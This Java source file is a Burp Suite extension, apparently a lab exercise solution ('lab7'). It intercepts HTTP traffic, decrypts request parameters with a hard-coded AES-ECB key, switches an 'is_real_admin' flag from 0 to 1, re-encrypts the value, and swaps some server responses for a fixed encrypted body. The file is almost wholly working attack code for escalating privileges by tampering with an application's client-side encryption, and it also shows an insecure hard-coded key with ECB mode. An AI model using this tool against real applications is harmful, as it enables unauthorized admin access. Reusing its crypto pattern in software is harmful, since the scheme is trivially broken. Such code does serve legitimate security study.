package burp;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.List;

public class BurpExtender implements IBurpExtender, IHttpListener {

    static class crypt {

        private static final String DEFAULT_CODING = "utf-8";
        private static final String MESSAGEDIGESTALGORITHMS = "MD5";
        public static final String str2 = "s3cr37K3y";

        public static String decrypt(String str) {
            byte[] bArr;
            try {
                SecretKeySpec secretKeySpec = new SecretKeySpec(MessageDigest.getInstance(MESSAGEDIGESTALGORITHMS).digest(str2.getBytes(DEFAULT_CODING)), "AES");
                Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
                instance.init(2, secretKeySpec);
                final Base64.Decoder decoder = Base64.getDecoder();
                bArr = instance.doFinal(decoder.decode(str));
            } catch (Exception e) {
                System.out.println(e.toString());
                bArr = null;
            }
            assert bArr != null;
            return new String(bArr);
        }

        public static String encrypt(String str) {
            byte[] bArr;
            try {
                SecretKeySpec secretKeySpec = new SecretKeySpec(MessageDigest.getInstance(MESSAGEDIGESTALGORITHMS).digest(str2.getBytes(DEFAULT_CODING)), "AES");
                Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
                instance.init(1, secretKeySpec);
                bArr = instance.doFinal(str.getBytes(DEFAULT_CODING));
            } catch (Exception e) {
                System.out.println(e.toString());
                bArr = null;
            }
            final Base64.Encoder encoder = Base64.getEncoder();
            return encoder.encodeToString(bArr);
        }

        public static String replace(String str, int i) {
            if (i == 1) {
                return str.replace("!", "+").replace("@", "/").replace("#", "=");
            } else if (i == 2) {
                return str.replace("+", "!").replace("/", "@").replace("=", "#");
            } else {
                return str;
            }
        }

    }

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private static final String extender_name = "lab7 extension by GuanXiao";

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.printOutput(extender_name);
        callbacks.setExtensionName(extender_name);
        callbacks.registerHttpListener(this);
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (toolFlag == (toolFlag &
                (callbacks.TOOL_PROXY + callbacks.TOOL_REPEATER + callbacks.TOOL_SCANNER + callbacks.TOOL_INTRUDER))) {
            corfu(messageIsRequest, messageInfo);
        }
    }

    private void corfu(boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (messageIsRequest) {
            IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo);
            List<IParameter> parameterList = analyzeRequest.getParameters();
            byte[] new_Request = messageInfo.getRequest();

            for (IParameter parameter : parameterList) {
                if (parameter.getType() == 1) {
                    String old_key =parameter.getName();
                    String old_value = parameter.getValue();
                    String changed_value = crypt.decrypt(crypt.replace(old_value,1));
                    if (changed_value.contains("is_real_admin")) {
                        changed_value = changed_value.replace("\"is_real_admin\":0","\"is_real_admin\":1");
                        changed_value = crypt.replace(crypt.encrypt(changed_value),2);
                        IParameter newPara = helpers.buildParameter(old_key, changed_value, parameter.getType());
                        new_Request = helpers.updateParameter(new_Request, newPara);
                        messageInfo.setRequest(new_Request);
                    }
                }
            }
        } else {
            IResponseInfo analyzeResponse = helpers.analyzeResponse(messageInfo.getResponse());
            short statusCode = analyzeResponse.getStatusCode();
            List<String> headers = analyzeResponse.getHeaders();
            String response = new String(messageInfo.getResponse());
            int bodyOffset = analyzeResponse.getBodyOffset();
            String body = response.substring(bodyOffset);

            if (statusCode == 200) {
                String origin_body = crypt.decrypt(body);
                if (origin_body.contains("username")) {
                    String new_body = "wuicNZgrJE2EG5vhPG8kS9CIHBPyDQ/ox5uxhJsmzTwp+fXPqnxznq34VWnw0sUb581QyZ4Znj3hRCnv1PzoHQ==";
                    byte[] bodyByte = new_body.getBytes();
                    messageInfo.setResponse(helpers.buildHttpMessage(headers, bodyByte));
                }
            }
        }
    }

}